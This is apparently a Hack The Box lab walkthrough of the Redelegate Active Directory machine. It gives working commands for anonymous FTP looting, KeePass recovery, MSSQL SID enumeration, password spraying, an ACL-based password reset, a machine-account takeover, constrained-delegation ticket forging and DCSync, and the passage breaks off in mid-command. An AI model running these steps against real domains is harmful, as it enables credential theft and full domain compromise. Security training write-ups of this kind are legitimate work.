---
title: 'HTB Redelegate: Complete Evidence-Led Walkthrough'
description: Anonymous FTP and a leaked KeePass database led through low-privilege MSSQL SID enumeration, credential reuse, AD ACL abuse and constrained delegation
  to DCSync.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Hard
tags:
- Hack The Box
- Active Directory
- FTP
- KeePass
- MSSQL
- Constrained Delegation
- DCSync
published: true
slug: htb-redelegate
---

# Overview

**Machine:** Redelegate  
**Platform:** Hack The Box  
**Publication format:** htb-redelegate.md  

Redelegate is a useful example of an apparently low-value database account revealing information that anonymous LDAP and RPC could not. Enumeration breadth was central to the attack path.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

**Platform:** Hack The Box · **Difficulty:** Hard · **Operating system:** Windows Server 2022 (Build 20348)  
**Engagement date:** 27 October 2026 · **Primary target:** `10.129.234.50`  
**Domain:** `redelegate.vl` · **Domain controller:** `DC` / `dc.redelegate.vl`  
**Result:** **Domain compromise demonstrated** via successful DRSUAPI DCSync of the domain Administrator account.  
**Evidence boundary:** The available transcript **does not include** final Administrator WinRM/PsExec login or `root.txt`/`user.txt` retrieval. Do not report those as completed.

> **Scope and handling:** This authorized HTB lab reconstruction preserves confirmed commands and separately qualifies inferred steps. This archive is the redacted public edition.

---

### Executive summary

Redelegate began with anonymous access to Microsoft FTP on a Windows domain controller. The FTP directory exposed an internal audit memo, a cybersecurity training agenda, and a KeePass database (`Shared.kdbx`). The agenda explicitly warned against the pattern `SeasonYear!`; the database was subsequently opened with `<KEEPass_MASTER_AND_MARIE_PASSWORD>`, exposing application and service credentials, including `SQLGuest`.

`SQLGuest` could authenticate to SQL Server 2019 Express but had almost no useful SQL privileges. A first-pass review of database tables, role membership, SQL Agent jobs, and backup metadata seemed unproductive. **The pivotal breakthrough came from continuing MSSQL enumeration instead of abandoning the service:** SQL Server functions `SUSER_SID()` and `SUSER_SNAME()` resolved domain security identifiers to names, bypassing the practical blocker imposed by unauthenticated LDAP and RPC enumeration. This revealed a short list of domain users.

A targeted spray of the known KeePass master password succeeded for `REDELEGATE\Marie.Curie`. Marie belonged to `Helpdesk`, which held inherited `User-Force-Change-Password` rights over `Helen.Frost`. Control of Helen yielded a WinRM session on `DC`, membership in `IT`, and an enabled `SeEnableDelegationPrivilege`. Helen's `IT` group also had `GenericAll` over the apparently stale `FS01$` computer object.

The operator used that control to take over `FS01$` and configure classic constrained delegation with protocol transition to the domain controller's CIFS service. An S4U2Proxy request impersonating `Administrator` failed because Administrator was marked `NOT_DELEGATED`. A delegated ticket for the domain-controller identity succeeded, however, and a subsequent targeted `impacket-secretsdump` DRSUAPI request recovered the domain Administrator's NTLM hash and Kerberos keys. **Domain compromise was proven without needing to delegate the protected Administrator identity directly.**

#### Condensed attack chain

```text
Anonymous FTP on DC:21
    └─ CyberAudit.txt + TrainingAgenda.txt + Shared.kdbx
         └─ KeePass opened with <KEEPass_MASTER_AND_MARIE_PASSWORD>
              └─ SQLGuest SQL authentication on DC:1433
                   └─ SUSER_SID / SUSER_SNAME → domain user enumeration
                        └─ <KEEPass_MASTER_AND_MARIE_PASSWORD> reused by Marie.Curie
                             └─ Marie ∈ Helpdesk
                                  └─ inherited ForceChangePassword over Helen.Frost
                                       └─ Helen WinRM on DC; IT member
                                            └─ IT has GenericAll over FS01$
                                                 └─ FS01$ takeover + KCD/protocol transition
                                                      └─ S4U2Proxy as DC identity
                                                           └─ DRSUAPI DCSync → Administrator hash
```

#### Outcome and confidence

| Milestone | Evidence status |
|---|---|
| Anonymous FTP, leaked KeePass and documents | **Directly observed** |
| KeePass unlocked with `<KEEPass_MASTER_AND_MARIE_PASSWORD>` | **Directly observed**; specific recovery method not logged |
| SQLGuest authentication and SID enumeration | **Directly observed** |
| Password reuse: `Marie.Curie / <KEEPass_MASTER_AND_MARIE_PASSWORD>` | **Directly observed** |
| Marie → Helen password-reset ACL | **Directly observed** |
| Helen interactive WinRM logon | **Directly observed** (`whoami /all`, `hostname`) |
| IT → `FS01$` GenericAll | **Directly observed** |
| Password/delegation changes to `FS01$` | Commands supplied; exact success output **not retained**, but downstream Kerberos S4U success supports configuration |
| S4U2Proxy for DC identity | **Directly observed** |
| S4U2Proxy for Administrator | **Failed, directly observed**; `NOT_DELEGATED` verified |
| Administrator targeted DCSync | **Directly observed, successful** |
| Interactive Administrator/SYSTEM shell, flags | **Not shown in the provided record** |

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope, host inventory, and services

| Field | Observed value | Notes |
|---|---|---|
| DC IP | `10.129.234.50` | Reachable HTB target during exploitation |
| DC hostname | `DC` | SMB, RDP, LDAP |
| DC FQDN / realm | `dc.redelegate.vl` / `REDELEGATE.VL` | Kerberos and LDAP service principal |
| Domain | `redelegate.vl` | NetBIOS: `REDELEGATE` |
| Operating system | Windows Server 2022, build 20348 | DC |
| SQL instance | `DC\SQLEXPRESS` | SQL Server 2019 Express, RTM 15.0.2000.5 |
| SQL-reported server name | `WIN-Q13O908QBPG\SQLEXPRESS` | Internal name inconsistency: potentially stale `@@SERVERNAME`; not exploited |
| FS01 DNS A record | `10.10.118.126` | Not directly reachable from Parrot; only its AD computer object was needed |
| WEB01 DNS A record | No address returned | KeePass had a `WEB01` entry, but host not located |

#### Full TCP scan

The scan found **30 open TCP ports** (the initial Nmap response reported 65,505 closed). Important ports:

| Port(s) | Service | Observations |
|---|---|---|
| 21 | Microsoft FTP | Anonymous access enabled; three files available |
| 53 | DNS | SRV query worked; AXFR denied |
| 80 | IIS 10 | Default IIS splash page; TRACE reported supported |
| 88, 464 | Kerberos, kpasswd | Active Directory authentication |
| 135, 139, 445, 593 | RPC/SMB | SMB signing required; null authentication possible but enumeration restricted |
| 389, 636, 3268, 3269 | LDAP/LDAPS/global catalog | Domain `redelegate.vl`; anonymous subtree reads refused |
| 1433 | MSSQL | Microsoft SQL Server 2019 Express RTM |
| 3389 | RDP | `dc.redelegate.vl` certificate |
| 5985, 47001 | WinRM / HTTPAPI | Relevant after Helen access |
| 9389 | AD Web Services | Standard DC surface |
| 49664–58347 | High-numbered RPC | Not directly leveraged |

Representative commands:

```bash
sudo nmap -Pn -n -p- --min-rate 2000 -T4 --open -oA nmap/tcp-all 10.129.234.50
sudo nmap -Pn -n -sC -sV -p 21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,47001 -oA nmap/tcp-services 10.129.234.50
```

The service version scan confirmed `Microsoft-IIS/10.0`, anonymous Microsoft FTP, `redelegate.vl`, SMB signing, and SQL Server 2019. SMB reported Windows Server 2022 build 20348, name `DC`, domain `redelegate.vl`.

#### DNS checks

```bash
dig @10.129.234.50 redelegate.vl AXFR
dig @10.129.234.50 _ldap._tcp.dc._msdcs.redelegate.vl SRV
for host in fs01 web01; do dig @10.129.234.50 "${host}.redelegate.vl" A +short; done
```

Evidence:

```text
AXFR: Transfer failed.
_ldap._tcp.dc._msdcs.redelegate.vl. 600 IN SRV 0 100 389 dc.redelegate.vl.
dc.redelegate.vl. A 10.129.234.50
fs01.redelegate.vl. A 10.10.118.126
web01.redelegate.vl. → no A response
```

The SRV response also contained two `dead:beef::/` laboratory IPv6 addresses. They were not used in the attack chain.

#### Anonymous protocols and negative findings

```bash
nxc smb 10.129.234.50 -u '' -p '' --shares
smbclient -N -L //10.129.234.50/
rpcclient -U '' -N 10.129.234.50
# At rpcclient: enumdomusers; enumdomgroups; querydominfo
nxc ldap 10.129.234.50 -u '' -p '' --users
ldapsearch -x -H ldap://10.129.234.50 -b 'DC=redelegate,DC=vl' '(objectCategory=person)' sAMAccountName description userPrincipalName
nxc smb 10.129.234.50 -u '' -p '' --rid-brute
impacket-lookupsid -no-pass ''@10.129.234.50
```

- Null SMB authentication returned `[+] redelegate.vl\:` but share listing was denied with `STATUS_ACCESS_DENIED`; `Null Auth:True` **did not mean anonymous share access**.
- `rpcclient` user, group, and domain-info queries returned `NT_STATUS_ACCESS_DENIED`.
- LDAP returned `000004DC ... In order to perform this operation a successful bind must be completed`.
- `nxc --rid-brute` failed with LSAD `STATUS_ACCESS_DENIED`.
- `impacket-lookupsid` **timed out** to TCP/445, so its result was inconclusive - not proof of authorization denial.
- IIS served a standard 703-byte default page. `http-enum` yielded no interesting path, and the attempted Feroxbuster run failed to connect. Nmap reported HTTP `TRACE` support; there was no evidence of a useful HTTP exploit.

**Lesson:** We correctly distinguished failed permission checks from connection failures. The absence of anonymous LDAP/RPC access later made MSSQL SID resolution especially valuable.

---

## Analysis

MSSQL functions SUSER_SID and SUSER_SNAME resolved candidate AD identities even without read access to useful application tables. Reuse of the recovered vault password opened Helpdesk privileges, an inherited password-reset right, and control of an IT-managed computer object. Administrator itself was marked NOT_DELEGATED, so direct S4U2Proxy impersonation failed; delegation of the DC machine identity yielded a ticket capable of the demonstrated DCSync.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### Initial foothold: anonymous FTP and exposed artifacts

Nmap reported anonymous login (`230`) and three readable files:

```text
10-20-24  01:11AM      434  CyberAudit.txt
10-20-24  05:14AM     2622  Shared.kdbx
10-20-24  01:26AM      580  TrainingAgenda.txt
```

To obtain them cleanly:

```text
ftp 10.129.234.50
Name: anonymous
ftp> binary
ftp> get CyberAudit.txt
ftp> get TrainingAgenda.txt
ftp> get Shared.kdbx
ftp> bye
```

**Transfer pitfall:** The first recorded KeePass transfer ran in FTP ASCII mode and produced:

```text
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

This is a serious warning for binary content. We subsequently used/advocated FTP `binary` mode before opening the vault. Preserve originals and consider comparing checksums where possible. **Do not attribute the initial John failure conclusively to corruption**: that hypothesis was not verified.

#### CyberAudit.txt

```text
OCTOBER 2024 AUDIT FINDINGS

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

These findings forecasted the actual chain: a reused weak password, a Helpdesk password-reset ACL, and an unused/undermaintained computer object granting high control to IT. The audit was a **lead**, not proof of any particular exploit until the AD objects were enumerated.

#### TrainingAgenda.txt

The October 18, 2024 training session said:

```text
"Weak Passwords" - Why "SeasonYear!" is not a good password
```

That clue led to a targeted seasonal-password candidate list and eventually the KeePass master password `<KEEPass_MASTER_AND_MARIE_PASSWORD>`. Crucially, the exact same password later worked for a domain account.

---

### KeePass recovery, vault contents, and tooling pitfalls

#### Format identification and offline hash

```bash
file Shared.kdbx
# Shared.kdbx: Keepass password database 2.x KDBX
keepass2john Shared.kdbx > loot/keepass/shared.hash
```

John reported:

```text
KeePass [SHA256 AES 32/64]
iteration count: 600000
version: 2
algorithm: AES
```

The initial `SeasonYear!` variants for 2000–2026 were tested with John, but the recorded run found **zero** matching passwords. That run included the expected `<KEEPass_MASTER_AND_MARIE_PASSWORD>` candidate, which makes the discrepancy important to document. We do **not** have enough evidence to say whether the failure was due to a transfer/hash issue or something else. The user later identified the correct vault password and proved it by successfully opening the database.

#### Package and network errors

- `keepassxc-cli` initially returned `command not found`.
- `sudo apt install keepassxc-cli` returned `Unable to locate package`: on this Parrot/Debian system the CLI ships with the **`keepassxc`** package.
- Installing KeepassXC initially failed because Parrot package mirrors were unreachable, with `No route to host` and DNS timeouts. Connectivity was later restored and the correct package installed.
- The CLI printed `KdbxXmlReader::readDatabase: found 1 invalid group reference(s)` while **successfully listing entries**; this nonfatal warning did not block examination.

```bash
sudo apt install keepassxc
keepassxc-cli ls -R Shared.kdbx
# Supply KeePass master password: <KEEPass_MASTER_AND_MARIE_PASSWORD>
```

Observed listing:

```text
IT/
  FTP
  FS01 Admin
  WEB01
  SQL Guest Access
HelpDesk/
  KeyFob Combination
Finance/
  Timesheet Manager
  Payrol App
```

To inspect individual entries:

```bash
keepassxc-cli show -s Shared.kdbx 'IT/SQL Guest Access'
keepassxc-cli show -s Shared.kdbx 'IT/FS01 Admin'
```

#### Vault entry inventory (secrets redacted)

| Group / entry | Username or description | Password / value | Note |
|---|---|---|---|
| IT / SQL Guest Access | `SQLGuest` | `<SQLGUEST_PASSWORD>` | **Confirmed working in MSSQL** |
| IT / FTP | `FTPUser` | `<FTPUSER_PASSWORD>` | Marked `Deprecated`; FTP login failed |
| IT / FS01 Admin | `Administrator` | `<FS01_ADMIN_PASSWORD>` | Scoped by entry title to FS01; host unreachable directly |
| IT / WEB01 | `WordPress Panel` | `<WEB01_PANEL_PASSWORD>` | Application label, not established AD username |
| HelpDesk / KeyFob Combination | *(none)* | `<KEYFOB_COMBINATION>` | Physical/operational clue; not used |
| Finance / Timesheet Manager | `Timesheet` | `<TIMESHEET_PASSWORD>` | Not independently validated |
| Finance / Payrol App | `Payroll` | `<PAYROLL_PASSWORD>` | Original entry spelling preserved; not independently validated |

**Credential provenance matters:** These values were recovered from a vault, not necessarily from AD. Only `SQLGuest` was demonstrated to work on SQL Server. FTPUser was demonstrated to fail on FTP. The source transcript does not show successful SMB/WinRM validations for the other vault accounts; avoid inventing them.

---

### MSSQL: the crucial overlooked enumeration surface

#### Authenticate to SQL Server

```bash
impacket-mssqlclient 'SQLGuest:<SQLGUEST_PASSWORD>'@10.129.234.50
```

Observed:

```text
[*] Encryption required, switching to TLS
[*] INFO(DC\SQLEXPRESS): Changed database context to 'master'.
SQL (SQLGuest  guest@master)>
```

Basic identification:

```sql
SELECT @@VERSION;
SELECT @@SERVERNAME;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DEFAULT_DOMAIN() AS mydomain;
```

Results: SQL Server 2019 Express RTM on Windows Server 2022; SQL login `SQLGuest`, database context `guest@master`, Windows domain `REDELEGATE`; stored instance name `WIN-Q13O908QBPG\SQLEXPRESS`. **`@@SERVERNAME` not matching the host's current network name was an observation, not an exploited condition.**

#### SQL permissions and database contents

**Operational trap:** `impacket-mssqlclient` executes each input line separately. Our first multi-line SQL role query failed because fragments were submitted as separate statements. Run complete SQL queries **on one line**.

```sql
SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin, IS_SRVROLEMEMBER('securityadmin') AS IsSecurityAdmin, IS_SRVROLEMEMBER('serveradmin') AS IsServerAdmin, IS_SRVROLEMEMBER('dbcreator') AS IsDbCreator;
SELECT name, is_linked, product, data_source FROM sys.servers;
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');
SELECT permission_name, state_desc FROM sys.server_permissions WHERE grantee_principal_id = SUSER_ID();
SELECT name, HAS_DBACCESS(name) AS HasAccess FROM sys.databases;
```

Findings:

```text
Server roles: sysadmin=0; securityadmin=0; serveradmin=0; dbcreator=0
Linked servers: none (only local WIN-Q13O908QBPG\SQLEXPRESS)
Effective server permissions: CONNECT SQL; VIEW ANY DATABASE
Explicit login permission: CONNECT SQL GRANT
Database access: master=1, tempdb=1, model=0, msdb=1
```

The first attempt to select `state_desc` from `sys.fn_my_permissions()` was invalid because that function returns `entity_name`, `subentity_name`, and `permission_name`. The corrected query was `SELECT * FROM sys.fn_my_permissions(NULL,'SERVER')`.

Relevant database enumeration (each query typed on one line):

```sql
SELECT name FROM sys.databases;
SELECT s.name AS schema_name,t.name AS table_name FROM master.sys.tables t JOIN master.sys.schemas s ON t.schema_id=s.schema_id ORDER BY s.name,t.name;
SELECT s.name AS schema_name,t.name AS table_name FROM msdb.sys.tables t JOIN msdb.sys.schemas s ON t.schema_id=s.schema_id ORDER BY s.name,t.name;
SELECT s.name AS schema_name,t.name AS table_name FROM tempdb.sys.tables t JOIN tempdb.sys.schemas s ON t.schema_id=s.schema_id ORDER BY s.name,t.name;
```

Observed databases: `master`, `tempdb`, `model`, `msdb`. `master` exposed standard tables (`spt_fallback_db`, `spt_fallback_dev`, `spt_fallback_usg`, `spt_monitor`); `msdb` exposed backup/restore catalog table names; `tempdb` contained `#A4C4CDDB`. No custom application database was observed.

Additional checks:

```sql
SELECT name, enabled, description FROM msdb.dbo.sysjobs;
SELECT TOP (50) bs.database_name,bs.backup_start_date,bs.type,bmf.physical_device_name FROM msdb.dbo.backupset bs JOIN msdb.dbo.backupmediafamily bmf ON bs.media_set_id=bmf.media_set_id ORDER BY bs.backup_start_date DESC;
SELECT name, credential_identity FROM sys.credentials;
SELECT servicename,startup_type_desc,status_desc,service_account FROM sys.dm_server_services;
SELECT name,value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','Ad Hoc Distributed Queries','clr enabled');
```

- `msdb.dbo.sysjobs`: `SELECT permission was denied`.
- Backup-history query: no rows.
- `sys.credentials`: no rows visible.
- `sys.dm_server_services`: `VIEW SERVER STATE` denied.
- Configuration query: no rows returned in this low-privilege context; **not evidence that those settings were disabled**.

**Our consequential mistake:** We began to call MSSQL a dead end because normal SQL exploitation routes were unavailable. This was the wrong stopping condition. SQL Server can still resolve Windows identities without granting filesystem access, sysadmin membership, or SQL Agent control.

#### SID resolution: the actual breakthrough

The operator tested:

```sql
SELECT DEFAULT_DOMAIN() AS mydomain;
SELECT SUSER_SID('REDELEGATE\Domain Admins');
```

Response:

```text
mydomain = REDELEGATE
SUSER_SID('REDELEGATE\Domain Admins') =
[REDACTED_TOKEN_CONTINUATION]
```

A Windows domain SID has a fixed domain portion followed by a four-byte **little-endian RID**. `Domain Admins` has RID `512` (`0x00000200` → bytes `00 02 00 00`). We stripped that last four-byte RID and generated new candidates.

The manual RID-500 test:

```sql
SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847aF4010000);
```

Returned `WIN-Q13O908QBPG\Administrator`. That hostname prefix is odd relative to `DC`; it is **not sufficient, by itself, to identify this as a distinct account**. The other RIDs returned normal `REDELEGATE\...` identities. We relied on the ensuing domain account results and independent AD checks, not the anomalous name mapping.

**First failed bulk query:** The initial attempt to append `REVERSE(CONVERT(binary(4),rid))` generated a `varbinary`/`varchar` type mismatch. Correct approach: append four explicitly typed single-byte binary values in little-endian order.

**Working single-line RID enumeration query (500–2500):**

```sql
;WITH R AS (SELECT 500 AS rid UNION ALL SELECT rid+1 FROM R WHERE rid<2500) SELECT R.rid, A.account_name FROM R CROSS APPLY (SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847a + CONVERT(binary(1),R.rid%256) + CONVERT(binary(1),(R.rid/256)%256) + CONVERT(binary(1),(R.rid/65536)%256) + CONVERT(binary(1),(R.rid/16777216)%256)) AS account_name) A WHERE A.account_name IS NOT NULL ORDER BY R.rid OPTION (MAXRECURSION 0);
```

Selected successful resolutions:

| RID | Name | Type / relevance |
|---|---|---|
| 500 | `WIN-Q13O908QBPG\Administrator` | Naming anomaly noted |
| 501, 502 | `REDELEGATE\Guest`, `REDELEGATE\krbtgt` | Built-in domain accounts |
| 512–527 | `Domain Admins`, `Domain Users`, etc. | Built-in domain groups |
| 1000 | `SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG` | SQL-related identity |
| 1002 | `REDELEGATE\DC$` | Domain-controller machine identity |
| 1103 | `REDELEGATE\FS01$` | Computer object used later |
| 1104 | `REDELEGATE\Christine.Flanders` | Domain user |
| 1105 | `REDELEGATE\Marie.Curie` | **First compromised domain user** |
| 1106 | `REDELEGATE\Helen.Frost` | ACL takeover / WinRM |
| 1107 | `REDELEGATE\Michael.Pontiac` | Domain user |
| 1108 | `REDELEGATE\Mallory.Roberts` | Domain user; account restriction observed during spray |
| 1109 | `REDELEGATE\James.Dinkleberg` | Domain user |
| 1112–1116 | `Helpdesk`, `IT`, `Finance`, `DnsAdmins`, `DnsUpdateProxy` | Groups |
| 1117 | `REDELEGATE\Ryan.Cooper` | Domain user |
| 1119 | `REDELEGATE\sql_svc` | Service user |

This gave us a usable account list **even though anonymous LDAP searches, RPC enumeration, and SMB RID brute force were unavailable**. This is the central technical lesson of the box.

---

### Credential reuse → Marie.Curie

We extracted likely users from the SID enumeration into `loot/users.txt`:

```text
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Ryan.Cooper
sql_svc
```

The operator tested a **single carefully chosen password** (`<KEEPass_MASTER_AND_MARIE_PASSWORD>`) that was already known to unlock KeePass and matched the training agenda's `SeasonYear!` warning:

```bash
nxc smb 10.129.234.50 -d redelegate.vl -u loot/users.txt -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' --continue-on-success
```

Critical output:

```text
[-] redelegate.vl\Christine.Flanders:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
[+] redelegate.vl\Marie.Curie:<KEEPass_MASTER_AND_MARIE_PASSWORD>
[-] redelegate.vl\Helen.Frost:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
[-] redelegate.vl\Michael.Pontiac:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
[-] redelegate.vl\Mallory.Roberts:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_ACCOUNT_RESTRICTION
[-] redelegate.vl\James.Dinkleberg:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
[-] redelegate.vl\Ryan.Cooper:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
[-] redelegate.vl\sql_svc:<KEEPass_MASTER_AND_MARIE_PASSWORD> STATUS_LOGON_FAILURE
```

`Marie.Curie` was **confirmed valid**. `STATUS_ACCOUNT_RESTRICTION` for Mallory is a **separate status**, not evidence of successful authentication or proof that the tested password was valid. The other accounts returned logon failures. We stopped spraying once a foothold existed.

**Why this mattered:** The KeePass master password was reused as a domain-user password. This turned a read-only FTP exposure into authenticated AD access.

---

### Marie.Curie → Helen.Frost: inherited ForceChangePassword

#### Confirm Marie's membership

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' get membership 'Marie.Curie'
```

Observed: `Users`, `Domain Users`, **`Helpdesk`**, with Helpdesk SID ending in RID `1112`.

#### Enumerate writable AD users

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' get writable --otype USER --detail | tee loot/marie-writable-users.txt
```

The output showed `pwdLastSet: WRITE` for `Guest`, `Christine.Flanders`, `Helen.Frost`, `Michael.Pontiac`, `James.Dinkleberg`, and `sql_svc`. Marie's own object exposed numerous self-writable profile attributes. **A `pwdLastSet` write alone is not proof of password-reset authority**; we checked the target DACL for the specific extended right.

#### Inspect Helen's DACL

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' get object 'Helen.Frost' --attr nTSecurityDescriptor --resolve-sd
```

Decisive ACE:

```text
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: Helpdesk
nTSecurityDescriptor.ACL.11.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.11.ObjectType: User-Force-Change-Password
nTSecurityDescriptor.ACL.11.InheritedObjectType: User
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERITED
```

A second Helpdesk ACE granted `READ_PROP|WRITE_PROP` on `Pwd-Last-Set`. The password-reset attack depended on the **specific `User-Force-Change-Password` right** in ACL.11.

#### Reset Helen's password and open WinRM

Commands provided for this step:

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Marie.Curie' -p '<KEEPass_MASTER_AND_MARIE_PASSWORD>' set password 'Helen.Frost' '<HELEN_TEST_PASSWORD>'
nxc smb 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>'
nxc winrm 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>'
evil-winrm -i 10.129.234.50 -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>'
```

The exact BloodyAD password-reset success line and `nxc` results were **not pasted**, but a subsequent Evil-WinRM shell displayed:

```text
User Name: redelegate\helen.frost
Host: dc
Group: REDELEGATE\IT
Group: BUILTIN\Remote Management Users
SeMachineAccountPrivilege: Enabled
SeEnableDelegationPrivilege: Enabled
```

That is direct evidence of **authenticated interactive access as Helen on the DC**. It also independently establishes her `IT` group membership and the delegation privilege required by the next stage.

---

### Helen.Frost → FS01$ computer-account control

#### Direct network access to FS01 was not needed

DNS resolved `fs01.redelegate.vl` to `10.10.118.126`. From Parrot:

```text
ip route get 10.10.118.126
  via 192.168.165.2 dev ens33 src 192.168.165.128
ping: 100% packet loss
nc -vz -w 3 10.10.118.126 445: timed out
```

The original approach considered a pivot through the internal network. In practice, **AD control of `FS01$` via the reachable domain controller made direct connectivity to the FS01 host unnecessary**. A DNS record alone did not demonstrate FS01 itself was reachable or running.

#### Inspect original FS01$ state

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' get object 'FS01$' --attr msDS-AllowedToDelegateTo,userAccountControl,servicePrincipalName
```

Observed:

```text
distinguishedName: CN=FS01,CN=Computers,DC=redelegate,DC=vl
userAccountControl: WORKSTATION_TRUST_ACCOUNT
```

No `msDS-AllowedToDelegateTo` target or `servicePrincipalName` was returned in that response. This is a **snapshot before modification**, not proof that FS01 had no services or could not exist on the network.

#### Check Helen's effective writable attributes

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' get writable --otype COMPUTER --detail | tee loot/helen-writable-computers.txt
```

For `CN=FS01,CN=Computers,DC=redelegate,DC=vl`, the output included:

```text
msDS-AllowedToDelegateTo: WRITE
servicePrincipalName: WRITE
unicodePwd: WRITE
userAccountControl: WRITE
nTSecurityDescriptor: WRITE
OWNER: WRITE
DACL: WRITE
```

It also exposed dozens of other writable attributes. The important rights were the ability to control machine-account credentials and configure delegation settings.

#### Verify GenericAll via the DACL

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' get object 'FS01$' --attr nTSecurityDescriptor --resolve-sd | tee loot/fs01-acl.txt
```

Decisive output:

```text
nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: ACCOUNT_OPERATORS; Domain Admins; LOCAL_SYSTEM; IT
nTSecurityDescriptor.ACL.6.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.6.ObjectType: Self
```

`Helen.Frost` belonged to `REDELEGATE\IT`. Thus her effective rights over `FS01$` were consistent with **GenericAll / Full Control**. A linked computer identity with excessive control became the bridge between a lower-privileged WinRM foothold and domain-wide compromise.

---

### Constrained delegation with protocol transition

#### Take over the machine account and configure delegation

The following commands were provided in the engagement. Their individual success output is **not present in the supplied transcript**; the subsequent successfully issued S4U2Proxy ticket is strong downstream evidence that the necessary delegation conditions were established.

```bash
# Reset FS01$'s domain password. This can break a live machine's secure channel.
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' set password 'FS01$' '<FS01_TEST_PASSWORD>'

# Enable protocol transition for the FS01$ account.
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Permit delegation to the domain controller's CIFS service.
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
```

Mechanism:

1. **Control of `FS01$`** allows the operator to authenticate as the computer account after changing its password.
2. `TRUSTED_TO_AUTH_FOR_DELEGATION` allows **protocol transition** for the account when other requirements are met.
3. `msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl` establishes a permitted service for **classic Kerberos constrained delegation (KCD)**.
4. **S4U2Self** requests a service ticket identifying the chosen user to the controlled service; **S4U2Proxy** requests the delegated ticket to the configured target service.

Changing a machine-account password is disruptive outside a disposable lab. In a production assessment, seek explicit scope approval and use a non-disruptive test or coordinated maintenance procedure.

#### Successful ticket request: DC identity

Observed request (the first successful request used `-impersonate 'DC'`; later guidance suggested explicitly using `DC$`, but that separate request's output was not pasted):

```bash
impacket-getST -dc-ip 10.129.234.50 -spn 'cifs/dc.redelegate.vl' -impersonate 'DC' 'redelegate.vl/FS01$:<FS01_TEST_PASSWORD>'
```

Observed output:

```text
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Python `datetime.utcnow()` deprecation warnings accompanied the result but did **not** represent a Kerberos error.

#### Failed ticket request: protected Administrator

A separate `getST` attempt to impersonate `Administrator` reached S4U2Proxy and failed:

```text
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user FS01$ or initial TGT not forwardable
```

Instead of assuming the FS01 delegation configuration was wrong, we checked Administrator's AD attributes:

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'Helen.Frost' -p '<HELEN_TEST_PASSWORD>' get object 'Administrator' --attr userAccountControl,memberOf
